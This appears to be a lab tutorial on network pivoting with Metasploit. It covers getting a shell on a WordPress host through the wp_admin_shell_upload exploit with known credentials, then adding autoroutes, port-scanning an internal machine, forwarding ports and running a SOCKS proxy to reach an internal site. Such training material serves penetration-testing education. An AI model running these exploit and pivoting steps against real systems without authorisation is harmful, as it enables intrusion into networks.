# Advanced Pivoting

Let's launch the `msfconsole`.

```bash
sudo su
msfconsole
search shell_upload
use exploit/unix/webapp/wp_admin_shell_upload
show options
set RHOST 10.0.100.10
set USERNAME sammy
set PASSWORD qwerty1
run
```

We are now in the interpreter.
Let's go to the shell and ping the second machine (media).
We'll first ping to see if we can reach the machine then setup an autoroute.

```bash
shell
ping 10.0.148.217
run autoroute -s 10.0.148.0/24
background
route print
```

That show us the following:

```bash
Subnet            Netmask            Gateway
------            -------            -------
10.0.148.0        255.255.255.0      Session 1
```

First of all, let's scan the ports.

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.148.217
run
```

This shows the opened ports.
In this example, it will be the `port 80`.

Now that we know there is something on `port 80`, let's try to detect it.
Let's try the `http_version` auxiliary module.

```bash
use auxiliary/scanner/http/http_version
show options
RHOSTS 10.0.148.217
```

This doesn't work, let's close it and try to use other methods.
We could use a sock server or port forwarding.

## Using Portforwarding

`-l` is the local port, `-p` is the port you want to forward to and `-r` is the final route.

```bash
sessions -i 1
portfwd add -l 80 -p 80 -r 10.0.148.217
```

Now the content provided in `port 80` of the media machine is accessible from our kali machine.
If we type 127.0.0.1 that show us the `media.hackerinthehouse.com` website.
The website doesn't load the css files, we could try to add it to our hosts.

```bash
nano /etc/hosts
127.0.0.1
```

Since the portforwarding works, let's try to run nmap.

```bash
nmap -sV 127.0.0.1 -p80
```

This finds `Apache httpd 2.4.7 (Ubuntu)`.

## Using Sock server method

```bash
background
search socks
use auxiliary/server/socks4a
show options
set SRVPORT 6666
run
```

We are now running a socks server on port 6666.
To show all jobs running, write `jobs`.
Write `jobs -i id` to show a specific one.

```bash
sessions 2
run autoroute -s 10.0.148.0/24
background
```

Now if we go to proxies in firefox in the SOCKS host to port 6666, that will how us the website.
